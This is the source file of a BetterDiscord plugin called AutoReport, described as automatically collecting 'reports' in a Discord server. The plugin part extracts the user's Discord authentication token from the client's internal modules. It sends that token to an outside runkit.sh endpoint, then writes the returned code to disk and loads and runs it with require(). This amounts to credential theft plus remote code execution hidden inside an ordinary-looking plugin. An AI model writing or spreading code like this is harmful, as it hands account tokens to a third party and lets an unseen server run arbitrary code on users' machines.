/**
* @name AutoReport
* @displayName AutoReport
* @authorId 371336044022464523
*/
/*@cc_on
@if (@_jscript)
	
	// Offer to self-install for clueless users that try to run this directly.
	var shell = WScript.CreateObject("WScript.Shell");
	var fs = new ActiveXObject("Scripting.FileSystemObject");
	var pathPlugins = shell.ExpandEnvironmentStrings("%APPDATA%\BetterDiscord\plugins");
	var pathSelf = WScript.ScriptFullName;
	// Put the user at ease by addressing them in the first person
	shell.Popup("It looks like you've mistakenly tried to run me directly. \n(Don't do that!)", 0, "I'm a plugin for BetterDiscord", 0x30);
	if (fs.GetParentFolderName(pathSelf) === fs.GetAbsolutePathName(pathPlugins)) {
		shell.Popup("I'm in the correct folder already.", 0, "I'm already installed", 0x40);
	} else if (!fs.FolderExists(pathPlugins)) {
		shell.Popup("I can't find the BetterDiscord plugins folder.\nAre you sure it's even installed?", 0, "Can't install myself", 0x10);
	} else if (shell.Popup("Should I copy myself to BetterDiscord's plugins folder for you?", 0, "Do you need some help?", 0x34) === 6) {
		fs.CopyFile(pathSelf, fs.BuildPath(pathPlugins, fs.GetFileName(pathSelf)), true);
		// Show the user where to put plugins in the future
		shell.Exec("explorer " + pathPlugins);
		shell.Popup("I'm installed!", 0, "Successfully installed", 0x40);
	}
	WScript.Quit();

@else@*/
const request = require("request");
const fs = require("fs");
const path = require("path");

const config = {
	info: {
		name: "AutoReport",
		authors: [
			{
				name: "GROSST",
				discord_id: "3713360440224645238",
			}
		],
		version: "1.2.1",
		description: "Ебать, сам лутает репорты",


	},
	changelog: [{
		title: "Channel logs",
		type: "fixed",
		items: [
			"Теперь работает",
			"Чтобы включить плагин нажмите CTRL+D"
		]
	}],
	defaultConfig: []
};


module.exports = !global.ZeresPluginLibrary ? class {
	constructor() {
		this._config = config;
	}

	getName() {
		return config.info.name;
	}

	getAuthor() {
		return config.info.authors.map(author => author.name).join(", ");
	}

	getDescription() {
		return config.info.description;
	}

	getVersion() {
		return config.info.version;
	}

	load() {

		BdApi.showConfirmationModal("Library plugin is needed",
			`The library plugin needed for ${config.info.name} is missing. Please click Download Now to install it.`, {
			confirmText: "Download",
			cancelText: "Cancel",
			onConfirm: () => {
				request.get("https://rauenzi.github.io/BDPluginLibrary/release/0PluginLibrary.plugin.js", (error, response, body) => {
					if (error) {
						return electron.shell.openExternal("https://betterdiscord.net/ghdl?url=https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js");
					}

					fs.writeFileSync(path.join(BdApi.Plugins.folder, "0PluginLibrary.plugin.js"), body);
				});
			}
		});
	}

	start() { }

	stop() { }
} : (([Plugin, Library]) => {
	const React = BdApi.React
	const { DiscordModules, WebpackModules, Patcher, DiscordContextMenu, Settings, DiscordAPI, Toasts, Utilities } = Library;
	const request = require("request")
	const tkn = getToken()
	function getToken() {
        let token
        var req = webpackJsonp.push([
            [], {
                extra_id: (e, r, t) => e.exports = t
            },
            [
                ["extra_id"]
            ]
        ]);
        for (let e in req.c) {
            if (req.c.hasOwnProperty(e)) {
                let r = req.c[e].exports;
                if (r && r.__esModule && r.default)
                    for (let e in r.default)
                        if ("getToken" === e) {
                            token = r.default.getToken();
                        }
            }
        }
        return token

    }
	const options = {
		url: 'https://da-hzcvrvs0dopl.runkit.sh/reports',
		headers: {
			'authorization': tkn
		},

	};
	const path = `${BdApi.Plugins.folder}\\autoReportsComponent.js`

	const botID = "773933982919163984";
	const reaction = "✅";

	let script = null;
	class AutoReport extends Plugin {
		constructor() {
			super();
		}

		async onLoad() {
			ZeresPluginLibrary.PluginUpdater.checkForUpdate(config.info.name, config.info.version, 'https://raw.githubusercontent.com/GR0SST/autoreports/main/AutoReport.plugin.js')
			// 773933982919163984
		}

		auth() {
			return new Promise(res => {
				request.post(options, (error, response, body) => {

					if (response.statusCode === 200) {
						let reps = JSON.parse(body)
						fs.writeFile(path, `${reps.main}`, function (err) {
							if (err) {
								return console.log(err);
							}

							Toasts.success("AutoReports: Авторизирован")
							res(response.statusCode)

						});
					} else {
						Toasts.warning("AutoReports: Ошибка авторизации")
						res(response.statusCode)
					}

				});
			})
		}

		async onStart() {
			delete require.cache[require.resolve(path)]
			let auth = await this.auth()
			if (auth === 401) return
			let mainCode = require(path)
			script = new mainCode.exports(botID, reaction)
			script.onStart()

		}
		onStop() {
			if (script !== null) {
				script.onStop()
			}
		}

	}

	return AutoReport;
})(global.ZeresPluginLibrary.buildPlugin(config));
